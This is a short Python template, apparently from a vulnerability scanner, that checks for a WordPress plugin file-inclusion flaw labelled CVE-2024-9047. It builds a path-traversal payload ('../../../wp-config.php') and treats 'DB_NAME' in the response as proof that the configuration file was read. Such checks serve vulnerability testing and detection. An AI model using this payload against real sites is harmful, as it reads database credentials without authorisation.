"""
CVE-2024-9047: WordPress Plugin File Inclusion
Description: Remote file inclusion vulnerability in WordPress plugin allowing unauthorized file access
Severity: High
CVSS Score: 8.5
Affected Versions: Multiple WordPress plugins
Reference: https://wpscan.com/vulnerability/67890
"""

def get_payload():
    return {
        'path': '/wp-content/plugins/test-plugin/test.php',
        'method': 'GET',
        'params': {
            'file': '../../../wp-config.php'
        }
    }

def check_response(response):
    return response.status_code == 200 and 'DB_NAME' in response.text 